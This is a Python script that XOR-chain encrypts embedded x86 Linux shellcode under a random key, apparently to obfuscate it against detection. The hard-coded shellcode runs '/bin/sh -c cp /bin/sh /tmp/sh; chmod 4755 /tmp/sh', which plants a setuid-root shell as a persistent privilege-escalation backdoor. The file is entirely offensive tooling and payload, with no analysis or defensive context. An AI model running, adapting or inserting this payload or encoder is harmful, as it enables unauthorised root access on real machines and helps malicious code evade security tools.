import os


def pad(s: str, length: int, fillchar=' ') -> str:
    while len(s) < length:
        s += fillchar
    if len(s) > length:
        raise TypeError('Illegal arguments given!')
    return s


def encrypt(sc: str):
    key = os.urandom(4).hex()
    previous = key
    groups = [f'{pad(sc[i:i+8], 8, "90")}' for i in range(0, len(sc), 8)]
    encrypted_sc = []

    print('Encrypting...')
    print(f'Key is {key}')
    print(f'SC to encrypt: {sc}')

    for i, group in enumerate(groups):
        previous = f'{hex(int(previous, 16) ^ int(group, 16))[2:]:0>8}'
        encrypted_sc.append(previous)
    return key, encrypted_sc


if __name__ == '__main__':
    sc: str = '29c0b002cd8085c07502eb0529c040cd8029c029db29c9b046cd80eb2a5e8976328d5e08895e368d5e0b895e3a29c088460788460a88463189463e87f3b00b8d4b328d533ecd80e8d1ffffff2f62696e2f7368202d63206370202f62696e2f7368202f746d702f73683b2063686d6f642034373535202f746d702f7368'
    print(len(sc))
    print(encrypt(sc))
